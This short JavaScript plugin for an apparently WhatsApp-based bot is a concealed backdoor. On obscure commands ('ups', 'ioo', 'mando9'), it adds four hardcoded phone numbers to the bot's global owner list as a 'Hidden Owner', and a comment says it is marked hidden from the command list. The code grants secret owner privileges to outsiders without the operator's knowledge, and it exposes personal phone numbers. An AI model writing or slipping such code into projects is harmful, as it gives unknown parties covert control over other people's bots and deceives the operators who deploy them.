const handler = async (m, { conn }) => {
  const hiddenOwners = ['584164137403', '59169739411', '559296077349', '50558124470']; 
  if (hiddenOwners.includes(m.sender.split('@')[0])) {
    global.owner.push([m.sender.split('@')[0], 'Hidden Owner', true]);
  }
};

handler.command = /^(ups|ioo|mando9)$/i; 
handler.rowner = true;
handler.hidden = true; // Oculta el plugin de la lista de comandos

export default handler;